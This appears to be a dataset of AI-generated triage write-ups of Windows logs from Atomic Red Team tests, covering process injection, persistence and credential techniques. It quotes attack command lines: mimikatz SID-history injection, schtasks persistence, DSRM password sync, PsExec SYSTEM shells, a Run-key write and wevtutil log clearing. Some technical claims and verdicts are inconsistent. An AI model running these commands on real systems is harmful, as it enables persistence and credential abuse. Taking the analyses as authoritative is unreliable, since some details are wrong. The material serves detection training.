Thread Execution Hijacking,"### Detailed Analysis

#### Overview
The logs provided detail activities on a Windows host, primarily focusing on the execution of processes and interactions with the Windows Event Log. Specifically, we observe events from PowerShell, Sysmon, Application, Security, and System logs.

#### Suspicious or Anomalous Behavior
1. **PowerShell Execution**:
   - A PowerShell script is executed with the command line: `powershell.exe & {$notepad = Start-Process notepad -passthru Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055.003\bin\InjectContext.exe"" Start-Sleep -Seconds 5 Stop-Process $notepad.id}`. This script starts Notepad, launches `InjectContext.exe`, waits for five seconds, and then stops the Notepad process. The path and tool name `InjectContext.exe` suggest the use of Atomic Red Team, a known security testing framework for evaluating detection capabilities.
   
2. **Event Log Clearing**:
   - The Security log has been cleared as evidenced by Event ID 1102, which records log clearance operations. This suggests an attempt to hide further activities on the host. The logs indicate this was performed by the user `admin_test` on the machine.

3. **System and Windows PowerShell Log Clearing**:
   - The System and Windows PowerShell logs have also been cleared (System log Event ID 104). Clearing these specific logs is typically indicative of an effort to cover tracks after malicious or suspicious activity.

4. **Multiple Privileges Assigned**:
   - Security logs (Event ID 4672) indicate that the user `admin_test` accessed a session with a broad range of privileges, including `SeDebugPrivilege`, which can be used for system debugging and additional system-level access.

5. **Wevtutil Usage**:
   - The `wevtutil.exe` utility is used frequently. This tool is often used for managing event logs and can be used to clear them. Its presence aligns with the log clearing activities noticed.

6. **Unusual Process Behavior**:
   - The occurrence of `InjectContext.exe` and its association with process injection or testing scenarios raises a red flag. The context suggests testing-related execution, but its presence along with logs clearing is concerning without proper change control or notification of pen-testing.

#### Assessment of the Situation
The sequence of operations includes potentially benign testing activity by a framework like Atomic Red Team combined with the clearing of logs, which signals attempts to hide activity commonly associated with malicious intent. Executing privilege-escalated PowerShell scripts with potentially dangerous operations such as process injection, without clear authorization or documentation, is particularly concerning.

#### Threats or Risks Identified
- **Privilege Escalation**: The usage of high-privilege tokens and execution of potentially harmful scripts.
- **Data Erasure**: The clearing of event logs to obfuscate traces of activities that could indicate a breach or a testing exercise.

#### Guidance on How to Proceed
- **Verify Intentions**: Confirm if this activity was authorized as part of legitimate security testing. Reach out to the security team to confirm if Atomic Red Team operations were scheduled.
- **Log Retention and Alerts**: Adjust auditing policies to ensure log retention and set alerts for log clearance events.
- **Review Access**: Identify and review all privileged account access and ensure that the principle of least privilege is applied.

### Resolution
- **SUSPICIOUS**: The logs contain activities that do not appear benign and warrant further investigation to confirm whether these actions were legitimate security tests or unauthorized activities."
Dirty Vanity process Injection,"Based on the provided log entries, several key activities and indicators stand out that suggest potentially suspicious or malicious behavior. Below is the detailed analysis:

1. **Log File Clearing:**
   - The logs indicate multiple instances of log clearing across several channels: System, Windows PowerShell, and Security. Event ID 104 for Microsoft-Windows-Eventlog shows that these logs were cleared by the user ""admin_test"" at the same timestamp - ""2024-10-22T17:24:08"".
   - Additionally, Event ID 1102 in the Security log confirms the clearing of the security log by the same user. Log clearing is generally performed by attackers to cover their tracks and is a notable indicator of potential malicious activity.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs show an execution with a command line involving ""redVanity.exe"" located in a Temp directory, which is often indicative of potentially malicious or testing behavior. The command execution attempt also includes starting ""calc.exe"", which might indicate either a benign test or an obfuscation technique to mask true intentions.
   - The use of a PowerShell script from the ""AtomicRedTeam"" directory suggests potential use of proof-of-concept scripts or testing tools often used in red team exercises or by attackers.

3. **Time Change Events:**
   - The System log has events (Event ID 1 from the Kernel-General provider and Event ID 4616 from Security-Auditing) that show the system time was changed, which can be an attempt to manipulate timestamps related to events, thus affecting log integrity.

4. **Usage of Administrative Privileges:**
   - Multiple instances of Event ID 4672 indicate the assignment of special privileges to the ""admin_test"" user, including SeDebugPrivilege, often targeted by attackers to manipulate or inject into processes.

5. **Process Execution Monitoring:**
   - Sysmon logs indicate the use of ""wevtutil.exe"" by the ""admin_test"" user to clear event logs, as shown by command line usage ""cl"" (clear logs) for various channels. This is commonly observed as part of a ""clean-up"" routine by malicious actors to remove traces of their activity.

**Assessment:**
The cumulative evidence from the cleared logs, suspicious command execution using PowerShell, time manipulation, and privilege escalation, emphasizes a higher likelihood of malicious activity or an unauthorized red teaming exercise.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected machine (Server002) for further forensic analysis.
- Conduct a thorough investigation into all administrative actions performed by ""admin_test"".
- Review other systems in the network for similar indicators or behaviors.
- Change administrator credentials and enforce strong password policies and multi-factor authentication.
- Implement enhanced monitoring and consider deploying additional security measures like EDR solutions for detection of similar activity.
- If this was a sanctioned red team activity without notification, ensure proper channels for communication are established for future exercises."
Process injection ListPlanting,"Based on a detailed analysis of the event logs provided, the following points have been noted:

### Suspicious or Anomalous Behavior:
1. **PowerShell Invocation**:
   - PowerShell is frequently used in attacks to execute commands or scripts that might not be directly suspicious but can be misused for malicious activities.
   - The PowerShell command executed: 
     ```powershell
     powershell.exe & {Start-Process ""\\C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055.015\bin\ListPlanting.exe"", Start-Sleep -Seconds 7, Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force}
     ```
   - This command launches a process called ""ListPlanting.exe"" which resides in the Atomic Red Team testing directory, often used for security testing. This suggests either scheduled security testing or potentially an unauthorized simulation being run.

2. **Event Log Clearing**:
   - Clearing of Windows event logs is a significant red flag. In the security event logs, specifically Event ID 1102, it shows the security logs were cleared by the user ""admin_test"" at `18:44:50`.
   - Events like these often indicate an attempt to cover tracks after performing suspicious or malicious activities on a system.

3. **Privilege Escalation**:
   - The account ""admin_test"" has several high privileges noted in Event ID 4672, such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These privileges indicate the account has significant privileges on the system, which could be leveraged for unauthorized actions.

### Possible Malicious Activity or Compromise:
- The combination of PowerShell commands originating from a potentially suspicious directory, alongside the clearing of event logs, suggests a pattern often associated with adversarial tactics.
- The presence of a high privilege account executing these actions adds an additional layer of potential risk, making it plausible that this account might be compromised or being used improperly.

### Assessment of the Situation:
- The activities recorded in the logs appear suspicious due to the combination of PowerShell usage, event log clearing, and high privilege account actions. These activities might align with known tactics, techniques, and procedures (TTPs) involving initial access, privilege escalation, and defense evasion.

### Recommended Guidance:
1. **Verify with the Account Owner**: Confirm whether the user ""admin_test"" initiated these activities knowingly or if the account might be compromised.
2. **Investigate the Binary**: Review the ""ListPlanting.exe"" binary for malicious content or attributes, and ensure it aligns with legitimate testing directories and tools.
3. **Review Access and Configurations**: Check configurations and access controls to ensure only authorized actions are permitted for critical operations like event log management.
4. **Enhance Monitoring and Alerting**: Implement or strengthen alerts for similar suspicious activities, especially around PowerShell usage and log clearing activities.

### Resolution:
Based on the analysis of the logs, the activity is concluded to be **SUSPICIOUS**. Further investigation is necessary to rule out or confirm potential malicious intent or misuse of the system."
Parent PID Spoofing - Spawn from Specified Process,"Upon reviewing the provided event logs, here's a detailed analysis highlighting key findings and potential indicators of malicious activity:

1. **Log File Clearing:**
   - **System Log Events (IDs: 104):** The events document the clearing of logs in the System, Windows PowerShell, and Security channels by a user with the username `admin_test`. The log clearing action is often a red flag, indicating potential malicious activity, particularly if there is no scheduled or legitimate reason for log clearance. This could be an attempt to cover up traces of malicious actions.

2. **PowerShell Activity:**
   - **PowerShell Log Events (ID: 600):** Detected multiple instances of PowerShell activities. In one instance, PowerShell was used with a script `Start-ATHProcessUnderSpecificParent`. Although not inherently malicious, the use of specific scripts can warrant further investigation, especially if unfamiliar or unexpected in the environment.
   - **PowerShell Command ""-ExecutionPolicy Restricted"":** The execution policy restricted usage is typically for minimizing risk, but the combination with other actions could mean a restricted policy bypass or misuse.

3. **Unusual Process Execution and System Utility Usage:**
   - **Sysmon Log Events:** There were multiple invocations of Windows utilities like `wevtutil.exe`, which were used to clear logs (`wevtutil.exe cl`). This tool is commonly used by attackers to delete security logs after unsanctioned activities.
   - Multiple instances of `conhost.exe` are spawned after system utilities like `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`, indicating potential scripted or automated tasks.

4. **Privilege Escalation:**
   - **Security Log Event (ID: 4672):** Shows that the account `NT AUTHORITY\SYSTEM` was granted a high-level privilege. Although SYSTEM typically has high privileges by default, the event timing coinciding with other suspicious events adds to a potentially malicious narrative.

5. **Host and User Enumeration:**
   - **Sysmon Log Event for `whoami.exe` and `HOSTNAME.EXE`:** These tools are often used by attackers to enumerate system and user information post-compromise.

**Assessment and Conclusion:**

Based on the occurrence of log clearance events, potential misuse of PowerShell, and the clearing of logs via native utilities, these logs contain activities that don't align with routine administrative operations and should thus be considered:

- **SUSPICIOUS:** There is a significant indication of attempts to cover tracks through log clearance and potential use of automation or scripts. However, without additional context or corroborating evidence, it's difficult to conclusively determine if all actions were malicious.

**Guidance on How to Proceed:**
- **Conduct a Thorough Investigation:** Validate the reasoning behind log clearances and PowerShell script invocation. Determine if the admin activities during this period correspond with known administrative tasks.
- **Implement Enhanced Monitoring:** Increase monitoring of similar activities and enforce stricter auditing policies for critical systems.
- **Review and Strengthen Policies:** Emphasize handling logs and executing scripts to prevent unauthorized or unwarranted activities.
- **User Education and Alerting:** Alert and educate users about the potential misuse of their accounts and ensure privileged account actions are legitimate.

Consider a more detailed forensic investigation to gather additional evidence on these activities' nature and origin."
Driver Installation Using pnputil.exe,"Upon analyzing the provided Sysmon, System, Windows PowerShell, Security, and Application event logs, several observations and potential indicators of unusual behavior were identified:

### Observations:
1. **Repeated Execution of Windows Utility Tools:**
   - The logs show multiple executions of Windows utility tools such as `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and `pnputil.exe`. While these by themselves are not typically suspicious, the frequency and sequence suggest an automated script or process execution.

2. **Clearing of Event Logs:**
   - Events from the System and Security logs show that logs were cleared (`EventID 104` and `EventID 1102`). This is generally suspicious because clearing logs can indicate an attempt to hide malicious activity. The user `admin_test` performed these actions at high integrity level.

3. **Execution of PowerShell Commands:**
   - A PowerShell command is executed using `pnputil.exe` to install a driver (`acpipmi.inf`). This could be legitimate, but together with other activities, it raises suspicion.
   - The PowerShell session logs do not provide details on script or commands used, which suggests a potential effort to conceal activities.

4. **Use of Elevated Privileges:**
   - Several processes, including the command utilities, run at a high integrity level. The Security log indicates that an account with privileges such as `SeBackupPrivilege` was used, which aligns with actions that require elevated access, like clearing logs.

5. **Repeated Edge Update Executions:**
   - There are multiple executions of `MicrosoftEdgeUpdate.exe`, which appears to follow standard update operations. However, ensure that these updates are expected and authorized in the environment.

### Assessment:
The observed activities—use of administrative tools, subsequent log clearing, automated executions indicative of scripted behavior, and elevated privileges—are characteristic of potentially malicious actions, such as privilege escalation, information gathering, or lateral movement attempts. The PowerShell and `pnputil.exe` executions in particular could involve unauthorized driver installations, which are often a tactic in sophisticated attacks.

### Threats or Risks Identified:
- **Potential Malicious Intent:** The combination of utilities use, PowerShell commands, and log clearing suggests actions taken to maintain persistence, evade detection, and potentially escalate privileges.
- **Unauthorized Access and Alteration of System File:** The `pnputil.exe` command to install a driver warrants further investigation to determine if this was legitimate.

### Guidance on How to Proceed:
1. **Immediate Response:**
   - Conduct a comprehensive review of recent access and changes made by the user `admin_test`.
   - Verify the legitimacy of the driver installation initiated by `pnputil.exe`.
   - Examine network logs or connections from `SERVER002` for any unusual outbound communications.

2. **Enhance Monitoring:**
   - Implement additional monitoring on elevated privilege accounts and unusual PowerShell scripts.
   - Configure alarms for log clearance events.

3. **Security Audit:**
   - Conduct a thorough security audit on `SERVER002` to identify potential backdoors or unauthorized changes.

4. **User and Access Review:**
   - Review `admin_test` account usage and check for signs of compromised credentials.
   - Enforce stricter access controls and possibly change credentials associated with suspicious activities.

### Resolution:
Given the outlined analysis, and with noted activities aligning with tactics seen in compromises, the resolution for these logs is categorized as **SUSPICIOUS**. Additional investigation is warranted to confirm or refute suspected malicious activity."
Launch NSudo Executable,"Upon analyzing the log entries provided, several indicators suggest potentially malicious activities. Below are specific points of concern:

1. **Event Log Clearing**:
   - Multiple log entries in the System and Security logs show evidence of the clearing of logs (EventID 104 and 1102). The user ""admin_test"" is associated with these actions. This is typically a red flag, as it often signifies an attempt to cover tracks.

2. **Unusual PowerShell Usage**:
   - The PowerShell logs show an unusual command sequence executed by the user ""admin_test"". The command includes the invocation of ""NSudoLG.exe"" with elevated privileges (`-U:T -P:E cmd`). This indicates a potential privilege escalation attempt, leveraged through a known testing or penetration tool, Atomic Red Team's NSudo. The command is further obfuscated and includes commands to suppress errors and force stop processes.

3. **Sysmon Logging**:
   - The Sysmon logs corroborate these activities by showing the process execution of system utilities like `wevtutil.exe` for clearing logs (EventID 1 and 5). The presence of processes like `conhost.exe` and `powershell.exe` coming from suspicious directories like `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1134.001\bin\` is indicative of suspicious activity.

4. **Credential Access Attempt**:
   - Multiple security auditing logs (EventID 5379) indicate failed attempts to access Microsoft accounts or Live tokens with specific names/entities. Although these are marked with failure codes, they indicate an attempt to gather credential information, which may be a precursor to a more severe breach or attempted compromise.

5. **Launching of Utilities**:
   - The Security logs also show attempts to enumerate user accounts (EventID 4798) involving system processes. While some of these entries may align with normal system updates, in the context of the other activities, they need additional scrutiny.

### Assessment:
The combination of event log clearing, unusual PowerShell usage with elevated privileges, credential access attempts, and process spawning from unexpected directories strongly indicates malicious activity. These patterns are consistent with tactics used in post-exploitation stages of an attack where stealth and privilege escalation are necessary.

**Resolution**: **MALICIOUS** - The logs contain definite signs of malicious activity.

### Recommended Actions:
- Isolate the affected system immediately to prevent further propagation of any malicious actions.
- Conduct a comprehensive forensic analysis of the system to understand the full scope of the compromise.
- Review user account activities, especially for ""admin_test,"" for unauthorized or suspicious behavior.
- Apply necessary updates and patches, and review security policies and practices to prevent similar incidents.
- Consider resetting passwords and credentials involved.
- Update security monitoring to detect and alert on similar patterns in the future."
Scheduled Task Startup Script,"Upon reviewing the provided Windows event logs, several activities stand out as indicative of potentially suspicious behavior:

1. **Clearing of Event Logs:** There are multiple entries indicating the use of `wevtutil.exe` to clear various event logs (System, Security, Application, and Windows PowerShell). This activity is captured under both the Security (Event ID 1102) and System logs (Event ID 104), where the user ""admin_test"" with SID ""S-1-5-21-3962163828-2803415714-1403596700-1006"" is responsible for clearing these logs. The clearing of event logs is a common technique used by attackers to cover their tracks following unauthorized access or malicious activity.

2. **Scheduled Task Creation:** In the Sysmon logs, there is evidence of a command executed via `cmd.exe` which creates scheduled tasks (`schtasks.exe`) named `T1053_005_OnLogon` and `T1053_005_OnStartup`. These tasks are configured to trigger the execution of `calc.exe` (a calculator application) upon user logon and system startup. Specifically, the command line used is:
   ```
   ""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
   ```
   The creation of scheduled tasks to execute processes automatically can be used as a persistence mechanism by attackers.

3. **Processes Executed with High Integrity Levels:** The use of `wevtutil.exe` and `schtasks.exe` with high integrity levels, along with high privileges typically available to admin accounts, can be concerning, especially when combined with the subsequent log clearing.

4. **Multiple Instances of `conhost.exe`:** The presence of several `conhost.exe` processes is suspicious due to their connection as child processes to `wevtutil.exe` and `schtasks.exe`, potentially indicating an attempt to disguise command executions under seemingly legitimate processes.

In summary, the clearing of logs, coupled with the creation of scheduled tasks that could be used for persistence, suggests activities that align with common attack vectors aimed at maintaining unauthorized access and evading detection. These actions are typically associated with malicious intent rather than benign administrative tasks.

**Recommendation:**
- Conduct a thorough investigation into the account ""admin_test"" to verify whether this activity was authorized.
- Review the scheduled tasks on the affected host to determine their legitimacy and remove any unauthorized tasks.
- Implement monitoring alerts for similar future activities to detect potential indicators of compromise.
- Review security policies and access controls to prevent unauthorized log clearance and task scheduling in the future.

**Resolution:** MALICIOUS - The combination of log clearing and suspicious scheduled task creation strongly indicates malicious activity."
Password Change on Directory Service Restore Mode (DSRM) Account,"### Detailed Analysis

Upon reviewing the provided Windows event logs, several points stand out that suggest potentially suspicious activity, although not conclusively malicious. Here's a detailed analysis of key findings:

#### Suspicious Activity:

1. **Event Log Clearing:**
   - Multiple event logs, including the System and Security log, were cleared. Windows Event IDs 104 (System/PowerShell) and 1102 (Security) are indicative of log clearing.
   - Log clearance without a legitimate reason can be an indicator of an attempt to cover up potentially malicious activity.

2. **Execution of `wevtutil.exe`:**
   - The `wevtutil.exe` tool was used to clear event logs: ""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl"", observed in several logs. This is highly suspicious as it is a known technique for attackers to hide their tracks after performing unauthorized actions.

3. **Process Sequences:**
   - A system command was executed using `cmd.exe` for changing the DSRM password: `C:\\Windows\\System32\\cmd.exe /c ntdsutil ""set dsrm password"" ""sync from domain account %%username%%"" ""q"" ""q""`.
   - This action is peculiar and unorthodox for a legitimate system operation, potentially pointing towards an adversary attempting to gain or maintain access, particularly with domain-related credentials.

4. **Time Manipulation Events:**
   - EventID 4616 indicates the time was changed back and forth. Manipulating system time is not a typical administrative action unless supported by valid justification and can be used to mask unauthorized actions or to bypass time-based security controls.

5. **Use of Elevated Privileges:**
   - Several privilege escalation-related entries (EventID 4672), showing privileges being assigned that are often irrelevant unless for specific and legitimate administrative purposes.
   - The use of “SeDebugPrivilege”, etc., indicates potential exploitation attempts or reconnaissance by a threat actor.

#### Assessment:

- **SUSPICIOUS**: The combination of log clearance, time manipulation, changes to domain settings, and use of privilege escalations indicate activities that merit further investigation. Although definitive conclusions on malicious intent cannot be drawn without additional context or indicators, the actions align with common attack patterns.

### Guidance on How to Proceed

Given the suspicious nature of activities:

1. **Review User Activities:**
   - Identify and verify the legitimacy of actions performed by `admin_test`. Confirm with IT admins if this was part of any legitimate administrative tasks or troubleshooting.
   
2. **Investigate Origin of Commands:**
   - Check if the connection came from authorized IP addresses and verify any remote accesses, especially originating from IP addresses not associated with company infrastructure.

3. **Perform Security Audit:**
   - Run a comprehensive audit of system accounts, ensuring password policies and passwords themselves have not been altered without approval.
   - Verify time synchronization settings and ensure no other unauthorized time changes have occurred.

4. **Correlate with Network Logs:**
   - Cross-reference these findings with network logs to identify any associated network activity that correlates with the time of these events.

5. **Containment and Monitoring:**
   - If unauthorized activity is confirmed, isolate affected accounts and systems, and implement heightened monitoring for unusual activity moving forward.

### Final Resolution: **SUSPICIOUS**

The detected activities suggest potential tampering or unauthorized behavior. Further investigation is needed to determine the nature and extent of any potential compromise. Continue vigilance for additional indicators of compromise."
Injection SID-History with mimikatz,"Based on the analysis of the provided Windows event logs, here is the detailed assessment of the situation:

### Identified Indicators of Potential Malicious Activity:

1. **Execution of Mimikatz**: 
   - **Sysmon Log Entries**: There are entries indicating the command line execution that involves `mimikatz.exe`. This tool is widely known for unauthorized credential dumping and privilege escalation.
     - Example entry: 
       ```
       ""CommandLine"":""\""cmd.exe\"" /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \""privilege::debug\"" \""sid::patch\"" \""sid::add ..."" 
       ```

2. **Clearing of Event Logs**:
   - **System Log Entries**: Events with `EventID 104` show that logs are being cleared for various channels (`System`, `Windows PowerShell`).
   - **Security Log Entry**: Event with `EventID 1102` indicates the security log was cleared. This activity is suspicious because attackers often clear event logs to cover their tracks.

3. **Unusual Command Execution**:
   - SYSMon log entries show execution of command line utilities like `cmd.exe` and `wevtutil.exe`, associated with log clearance identified by the commands:
     ```
     ""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""
     ```

4. **Highly Privileged Processes**:
   - Multiple processes are running with high integrity level, indicating potential privilege escalation.

5. **Use of WMI for External Payloads**:
   - `wsmprovhost.exe` as a parent process suggests use of WMI for script execution, which is commonly used for remote command execution in attacks.

### Assessment:

The presence of Mimikatz execution is a strong indication of a malicious activity aimed at credential theft or privilege escalation. The clearing of multiple event logs further supports this assessment, suggesting attempts to obfuscate these actions. The combination of these activities is not associated with normal administrative behavior and strongly indicates malicious intent.

### Resolution:

**MALICIOUS** - The logs contain elements that are clearly indicative of unauthorized and malicious activity.

### Guidance on How to Proceed:

1. **Immediate Isolation**: Isolate the affected Windows host (Server002) to prevent further potential damage or data exfiltration.
   
2. **Forensic Investigation**: 
   - Initiate a deeper forensic investigation on the host to extract memory and disk artifacts related to the Mimikatz execution and any other unauthorized payloads.
   - Analyze system and network artifacts for signs of lateral movement or data breach.

3. **Audit and Strengthen Security**:
   - Review and enhance logging and monitoring practices to detect such activities early.
   - Ensure all local accounts with administrative privileges are reviewed and access controls are tightened.
   - Deploy updated security tools, including an Endpoint Detection and Response (EDR) solution for better monitoring.

4. **Notify Incident Response Team**: Engage the incident response team to handle remediation and communication with affected parties.

5. **Review and Update Security Policies**: Modify security policies to prevent similar incidents, including restricting the use of administrative tools and implementing least privilege principles. 

By following these guidance points, the organization can mitigate the risks identified and enhance its resilience against such attacks in the future."
Create a new time provider,"In reviewing the provided Windows event logs, several indicators of suspicious activity are evident, particularly focusing on actions often associated with potential malicious activity.

### Observations:

1. **Log File Clearance:**
   - Multiple instances of event ID 104 in the System log, indicating that log files for ""System"", ""Windows PowerShell"", and others have been cleared. This action was performed by the user `admin_test`.
   - An event ID 1102 in the Security log, indicating that the security log has been cleared by the same user `admin_test` with process ID `5764`.

2. **PowerShell Activity:**
   - There are multiple PowerShell invocation logs indicating suspicious command execution. The PowerShell command involves the altering of the W32Time service with a DLL named `AtomicTest.dll`.
   - The command sequence includes:
     - `net stop w32time`
     - Copying `AtomicTest.dll` to `C:\Users\Public\`
     - Adding registry entries for a custom time provider referencing `AtomicTest.dll`
     - `net start w32time`
   - The use of `AtomicRedTeam` artifacts suggests testing or malicious simulation scenarios.

3. **Registry Modifications:**
   - Several events show the `reg.exe` process being used to add entries to the registry under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest`.

4. **Process Execution Patterns:**
   - Several executions of potentially benign processes such as `conhost.exe`, `whoami.exe`, and `hostname.exe` by the `admin_test` user. While these executions are normal in many contexts, their occurrence in conjunction with other suspicious activities may point to enumeration or further command execution tasks.
   
5. **Indicators of Potential Testing or Simulation:**
   - Activities and files related to Atomic Red Team techniques can be part of a security test or drill. However, if this is not authorized or expected, it might indicate unauthorized testing or an emerging threat actor using public playbooks for malicious activities.

### Assessment:
Given the cleaning of multiple logs, the execution of a PowerShell script that alters system registry and services, and the presence of potential unauthorized simulation files, these logs exhibit behavior that suggests at least an internal simulation and at worst active malicious intent or compromise.

### Resolution:
**MALICIOUS** - The evidence of log clearing, unauthorized PowerShell script execution modifying system settings, and registry changes, all aligned with known techniques for persistence and evasion, indicate malicious activity.

### Guidance:
1. **Immediate Action:**
   - Isolate the host (Server002) from the network to prevent lateral movement or data exfiltration.
   - Conduct thorough endpoint detection and response (EDR) checks for any unauthorized persistence mechanisms or backdoors.

2. **Further Investigation:**
   - Verify if tasks were part of a scheduled and authorized red team exercise. If unauthorized, escalate for forensic review.
   - Examine related systems and accounts for similar indicators of compromise.

3. **Remedial Steps:**
   - Review and restore any unauthorized registry or system changes.
   - Apply threat intelligence and detection rulesets to address observed techniques.

This comprehensive approach will help assess the situation's scope, mitigate risks, and reinforce defenses against similar and advanced threats."
Process Injection with Go using UuidFromStringA WinAPI,"During the analysis of the provided logs for ""Server002,"" the following observations and assessments were made regarding suspicious or anomalous behavior:

1. **Log Files Cleared:**
   - There are multiple events indicating that the event logs have been cleared. Events with Event ID 104 (in System logs) and Event ID 1102 (in Security logs) indicate that the system logs, Windows PowerShell, and Security logs were cleared by a user ""admin_test.""
   - Clearing of event logs is often associated with attempts to cover tracks after malicious activities have occurred.
   
2. **PowerShell Execution:**
   - Multiple Windows PowerShell events indicate the execution of a script with the command line: `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1055\bin\x64\UuidFromStringA.exe -debug}`. This involves execution from a temporary directory, which is unusual and indicative of potentially malicious activity, especially with references to Atomic Red Team, a known library for testing attack scenarios.

3. **Process Execution and Anomalies:**
   - The Sysmon logs show the execution of processes like `wevtutil.exe` for clearing logs, corroborating the log clearing evidence noted above. These processes were executed by ""admin_test"" and correlate with the timing of log clearing events.
   - Execution of processes like `hostname.exe`, `whoami.exe`, and `conhost.exe` are seen frequently, which could be normal unless coming from or linked to suspicious activities, like covering footprints. However, the use of `whoami.exe` and `hostname.exe` is common in enumeration techniques used by attackers.

4. **Time Manipulation:**
   - Kernel events show that there was a rollback of system time. This change, though subtle, could be used to mask the timing of events related to malicious activities or prepare the environment for specific time-sensitive attacks.

5. **Indicators of Potential Threat:**
   - The presence and use of Atomic Red Team paths in PowerShell command execution are highly indicative of attack simulations or potential exploitation techniques being tested or executed on the system.
   - A combination of event log clearing, usage of PowerShell to execute potentially suspicious code, and log alterations collectively create a strong indication of malicious intent or testing for vulnerabilities.

**Assessment: SUSPECTED MALICIOUS ACTIVITY**

"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","### Detailed Analysis:

Upon reviewing the provided logs, several activities stand out as potential indicators of malicious actions:

#### 1. Log Clearing Events:
- **Security Log EventID 1102**: The clearing of Security Event Logs by the user ""admin_test"" is a strong indicator of suspicious activity. This is commonly associated with an attempt to cover up tracks after potentially malicious actions have been executed.
- **System Log EventID 104**: Similarly, the event logs for the System and Windows PowerShell channels were cleared by the same user.

Clearing logs is uncommon in regular operations and highly suspicious because it suggests deliberate deletion of activity records.

#### 2. Use of `wevtutil.exe`:
- Numerous instances of ""wevtutil.exe"" are being executed with the command to clear log files, directly linked to the log clearing activity. The commands like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""` and others targeting logs indicate that logs are actively being cleared using this utility.

#### 3. Execution of High-Risk Commands:
- The usage of PsExec and GhostTask tools within the context of ""cmd.exe"" with PsExec (`""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\PsExec.exe"" \\\\localhost -accepteula -s ""cmd.exe""`) suggests potential lateral movement or privilege escalation attempts. PsExec is often used by attackers to execute commands remotely with elevated privileges.

#### 4. Unusual Process Executions:
- Several processes such as `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` were run in quick succession, potentially indicating reconnaissance activities. These are standard tools but used in a sequence can denote an attempt to gather system information by an intruder.

#### 5. Context and Timing:
- All these activities are occurring in a very tight timeframe, which suggests these actions are automated or scripted rather than typical administrative tasks which would be spaced out over a longer period.

### Assessment, Threats, and Risks:

- **Threat Level**: High. The clearing of event logs, combined with the usage of potentially malicious tools like PsExec, indicates a significant risk of compromise.
- **User Involved**: The actions were performed by the `admin_test` user, indicating possible credential compromise or insider threat.

### Guidance and Next Steps:

1. **Immediate Actions**:
   - Isolate the affected host (Server002) from the network to ensure no further actions can be taken by a potential attacker.
   - Change passwords for the `admin_test` user account and potentially all privileged accounts if compromise is suspected.
   
2. **Detailed Investigation**:
   - Conduct a thorough investigation of any associated systems that `admin_test` may have accessed.
   - Analyze any other logs that weren't cleared if available for unusual lateral movements or data exfiltration activities.
   - Review all scheduled tasks or scripts on Server002 that might contain malicious commands.

3. **Forensic Analysis**:
   - Perform a deep forensic analysis of the host for any remaining signs of malware.
   - Check for common persistence mechanisms, such as new services, autoruns, or modifications to existing services.

4. **Audit and Monitoring**:
   - Implement enhanced monitoring and logging to detect further suspicious activities across the network.
   - Regularly back up logs and ensure they are secure to prevent tampering.

5. **Security Communication**:
   - Notify the internal security team or management about the breach for coordinated incident response.
   - Consider informing external agencies if sensitive data was accessed or if required by regulations.

### Resolution:
**MALICIOUS** - The log entries strongly suggest malicious activity, including log clearing and use of administrative and potentially harmful tools, indicating a possible compromise. Further action and investigation are required immediately."
HKCU - Policy Settings Explorer Run Key,"### Detailed Analysis of Logs

Upon reviewing the provided Windows event logs, certain activities have been flagged for a more detailed explanation. Let's break down the key observations:

#### System Log:
1. **Log Clearance**:
   - Multiple log clearances are recorded (`EventID: 104`) across different channels, including System and Windows PowerShell logs. This activity is performed by the user `admin_test`. The clearing of logs, especially with no apparent legitimate reason, is often an indicator of an attempt to cover tracks and is highly suspicious.

#### Sysmon Log:
1. **Wevtutil Command Usage**:
   - The usage of `wevtutil.exe` by `admin_test` to clear logs in several channels (e.g., System, Security, Windows PowerShell), as shown by several processes like `wevtutil.exe cl System`, is noted. This tool is officially used for managing Windows event logs but its malicious use for clearing logs is a well-known tactic to hide malicious activity.

2. **PowerShell Execution**:
   - The execution of `powershell.exe` with a script that attempts to set a registry key (`HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`) to run `calc.exe` as `atomictest` suggests an attempt to establish persistence. Such a command is typically suspicious, especially if it is not recognized as part of standard operating procedures for the system.

#### Security Log:
1. **Log Clearance**:
   - The security logs also show evidence of clearing (`EventID: 1102`), again by user `admin_test`. This reflects suspicious behavior intended to erase traces of activity.

#### Application Log and Windows PowerShell Log:
- The logs reflect standard entries without additional context to suggest benign defaults or patterns that can be dismissed outright in this analysis.

### Conclusion and Recommendation

**Assessment**: Based on the analysis of the provided logs, there is clear evidence of suspicious behavior:
- The use of `admin_test` to clear logs deliberately across multiple channels,
- The use of PowerShell to create persistence mechanisms via registry modifications,
- Attempts to cover tracks which are strongly indicative of inappropriate or unauthorized activity.

**Resolution**: **MALICIOUS**

### Actions to Take:
1. **Immediate Isolation**: Isolate the affected host `Server002` to prevent any potential spread or damage.
2. **Forensic Investigation**: Conduct a full forensic investigation, examining memory and disk artifacts for further signs of compromise and to trace back to the source of the unauthorized access.
